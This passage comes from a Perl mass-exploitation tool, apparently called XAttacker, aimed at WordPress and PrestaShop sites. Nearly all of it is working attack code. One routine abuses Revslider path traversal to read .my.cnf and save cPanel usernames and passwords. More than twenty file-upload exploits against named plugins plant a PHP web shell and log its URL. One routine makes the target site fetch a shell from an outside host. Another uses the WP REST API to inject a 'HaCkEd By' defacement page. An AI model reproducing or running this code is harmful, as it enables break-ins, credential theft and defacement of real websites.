$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get cPanel";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $site/cpanel\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>Result/cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get cPanel";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";
}
}

################ Showbiz #####################
sub showbiz(){
my $url = "$url/wp-admin/admin-ajax.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["XAttacker.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/XAttacker.php?X=Attacker';

my $checkshow = $ua->get("$showbizup")->content;
if($checkshow =~ /X Attacker/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Showbiz";
print color('bold white')," ........................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $showbizup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$showbizup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Showbiz";
print color('bold white')," ........................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ Simple Ads Manager #####################
sub ads(){
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["XAttacker.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/XAttacker.php?X=Attacker";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Simple Ads Manager";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $adsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$adsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Simple Ads Manager";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XAttacker.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/XAttacker.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/XAttacker.php?X=Attacker";

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Slide Show Pro";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sspup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Slide Show Pro";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
##############################################################################################
sub wpmobiledetector(){
$wpmdshell = "http://testatranslations.com/shell/XAttacker.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/XAttacker.php?X=Attacker";

my $check = $ua->get("$url");

my $checkup = $ua->get("$wpmdup")->content;
if($checkup =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpmdup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ WYSIJA #####################
sub wysija(){
$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['XAttacker.zip', => 'XAttacker.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/XAttacker/XAttacker.php?X=Attacker";
my $checkwysija = $ua->get("$wysijaup")->content;
if($checkwysija =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wysija";
print color('bold white')," ............................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wysijaup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wysijaup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wysija";
print color('bold white')," ............................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ InBoundio Marketing #####################
sub inboundiomarketing(){
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/XAttacker.php?X=Attacker";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["XAttacker.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"InBoundio Marketing";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $inbomarketingup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"InBoundio Marketing";
print color('bold white')," ............... ";
print color('bold red'),"NOt VULN\n";
}
}


################ dzs-zoomsounds #####################
sub dzszoomsounds(){
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/XAttacker.php?X=Attacker";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["XAttacker.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"dzs-zoomsounds";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dzsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"dzs-zoomsounds";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/XAttacker.php?X=Attacker";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["XAttacker.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Reflex Gallery";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $reflexup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$reflexup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Reflex Gallery";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ Creative Contact Form #####################
sub sexycontactform(){
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/XAttacker.php?X=Attacker";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["XAttacker.php"] ]

            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Creative Contact Form";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sexycontactup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Creative Contact Form";
print color('bold white')," ............. ";
print color('bold red'),"NOt VULN\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="XAttacker.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/XAttacker.php?X=Attacker";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ......... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wtffup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ......... ";
print color('bold red'),"NOt VULN\n";
}
}

################ WP Job Manger #####################
sub wpjm(){
my $url = "$site/jm-ajax/upload_file/";
my $image ="XAttacker.php";
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$image"] ]

            );

$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/XAttacker.gif";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/image\/gif/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jobmangerup\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
open (TEXT, '>>Result/index.txt');
print TEXT "$jobmangerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Job Manger";
print color('bold white')," ..................... ";
print color('bold red'),"NOt VULN\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="XAttacker.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/XAttacker.php?X=Attacker";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"PHP Event Calendar";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $phpevup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"PHP Event Calendar";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="XAttacker.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/XAttacker.php?X=Attacker";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Synoptic";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $Synopticup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$Synopticup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Synoptic";
print color('bold white')," .......................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ Wpshop #####################
sub Wpshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="XAttacker.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/XAttacker.php?X=Attacker";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wp Shop";
print color('bold white')," ........................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpshopup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wpshopup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wp Shop";
print color('bold white')," ........................... ";
print color('bold red'),"NOt VULN\n";
}
}
# this exploit Content Injection coded by fallag gassrini <3
################ Content Injection #####################
sub wpinjection(){
$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';

$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;

$ajx = $site . '/wp-json/wp/v2/posts/'.$id;

$sirina=$id . 'justrawdata';
$index='<p align="center"><img border="0" src="http://vignette4.wikia.nocookie.net/trollpasta/images/3/34/Fuck-you-cartoon-meme.gif" width="339" height="476"></p><pre>&nbsp;</pre><div align="center"><p align="center" class="auto-style2">
    <font face="Bradley Hand ITC" size="6">HaCkEd By Mohamed Riahi</font></p>
    <p align="center" class="auto-style2">';
$gassface = POST $ajx, [
'id' => $sirina, 'slug' => '/m.htm', 'title' => 'HaCkEd By Mohamed Riahi ', 'content' => $index];
$response = $ua->request($gassface);
$stat = $response->content;
    if ($stat =~ /HaCkEd/){
$urljson = "$site/m.htm";
$link = $ua->get($site);
$link = $link->request->uri;
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Content Injection";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Injected Successfully\n";
print color('bold white'),"  [Link] => $urljson\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$urljson\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Content Injection";
print color('bold white')," ................. ";
print color('bold red'),"NOt VULN\n";
}
}
}



######################################################
#################### PrestaShoP ######################
######################################################

################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/XAttacker.php?X=Attacker";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $columnadvertsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";
print color('bold white')," ..................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/XAttacker.php?X=Attacker";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";
print color('bold white')," ....................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$soopabannersup="$site/modules/soopabanners/slides/XAttacker.php?X=Attacker";

my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";
print color('bold white')," ...................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $soopabannersup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";
print color('bold white')," ...................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/XAttacker.php?X=Attacker";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $vtermslideshowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/XAttacker.php?X=Attacker";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $simpleslideshowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/XAttacker.php?X=Attacker";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $productpageadvertsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$homepageadvertiseup="$site/modules/homepageadvertise/slides/XAttacker.php?X=Attacker";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertiseup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";
print color('bold white')," ................. ";
print color('bold red'),"NOt VULN\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/XAttacker.php?X=Attacker";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $homepageadvertise2up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/XAttacker.php?X=Attacker";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ............. ";
print color('bold red'),"NOt VULN\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/XAttacker.php?X=Attacker";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
